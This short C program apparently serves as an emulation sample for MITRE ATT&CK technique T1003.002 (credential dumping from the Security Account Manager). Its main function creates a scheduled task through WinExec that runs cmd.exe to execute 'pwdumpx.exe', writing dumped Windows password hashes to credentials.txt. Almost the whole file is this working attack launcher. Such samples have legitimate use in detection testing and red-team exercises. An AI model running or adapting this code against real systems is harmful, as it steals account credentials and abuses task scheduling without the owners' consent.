// Link      = https://attack.mitre.org/techniques/T1003/002/
// Technique = OS Credential Dumping: Security Account Manager
// ID        = T1003.002
// Tactics   = Credential Access

#include <windows.h>

#define RUN(toRun) WinExec("schtasks /create /tn MyTask /tr \"cmd.exe /c \"" toRun "\" /sc once /st 00:00", SW_SHOW);

int main() {
    RUN("pwdumpx.exe > credentials.txt");
    return 0;
}